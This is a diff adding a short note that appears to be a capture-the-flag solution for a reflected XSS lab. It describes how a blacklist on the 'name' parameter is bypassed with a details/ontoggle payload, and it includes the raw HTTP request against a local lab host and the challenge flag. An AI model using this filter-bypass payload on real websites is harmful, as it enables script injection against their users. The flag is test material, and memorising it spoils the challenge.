@@ -1,0 +1,4 @@
+# Reflected XSS on /page via name param. Blacklist blocks script/onerror/onload/single-quotes. Bypass: use <details open ontoggle=alert("XSS")> with double quotes. Flag: flag{1ed5a2a2-4910-4843-bfcf-61d3d8831730}
+
+GET /page?name=%3Cdetails+open+ontoggle%3Dalert(%22XSS%22)%3E HTTP/1.1
+Host: 172.17.0.1:49471
